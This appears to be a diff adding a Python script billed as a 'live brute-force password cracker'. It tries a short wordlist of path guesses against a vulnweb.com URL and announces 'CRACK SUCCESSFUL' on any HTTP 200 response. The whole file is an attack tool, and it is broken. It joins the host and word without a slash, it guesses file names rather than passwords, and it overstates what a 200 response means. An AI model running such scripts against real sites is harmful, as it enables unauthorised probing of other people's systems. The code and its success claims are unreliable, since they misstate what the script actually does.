@@ -1,0 +1,50 @@
+import requests
+import os
+
+os.system("clear")
+print("=========================================")
+print("[+] LIVE BRUTE-FORCE PASSWORD CRACKER    ")
+print("=========================================")
+
+wordlist = [
+    "password123",
+    "12345678",
+    "artists",
+    "qwerty",
+    "administrator",
+    "welcome2026"
+]
+
+target_base_url = "http://vulnweb.com"
+
+print(f"[*] Target Main URL: {target_base_url}")
+print(f"[*] Wordlist Loaded: {len(wordlist)} potential keys found.")
+print("[*] Starting Brute-Force Attack Line... Please wait...")
+print("-" * 55)
+
+key_found = False
+
+for key in wordlist:
+    attack_url = target_base_url + key + ".php"
+    print(f"[*] Trying Key: [ {key} ] -> Attacking: {attack_url}")
+
+    try:
+        response = requests.get(attack_url, timeout=3)
+
+        if response.status_code == 200:
+            print(f"\n[!!!] CRACK SUCCESSFUL! VALID KEY FOUND !!!")
+            print(f"[+] Working Directory/Key: {key}")
+            print(f"[->] UNLOCKED URL: {attack_url}")
+            key_found = True
+
+    except Exception as e:
+        print(f"[!] Connection skipped for key: {key}")
+
+print("-" * 55)
+if key_found:
+    print("[+] Status: TARGET VULNERABILITY EXPLOITED SUCCESSFULLY.")
+else:
+    print("[-] Status: Brute-force failed. None of the keys matched the lock.")
+
+print("-" * 55)
+print("[+] Mission Accomplished!")
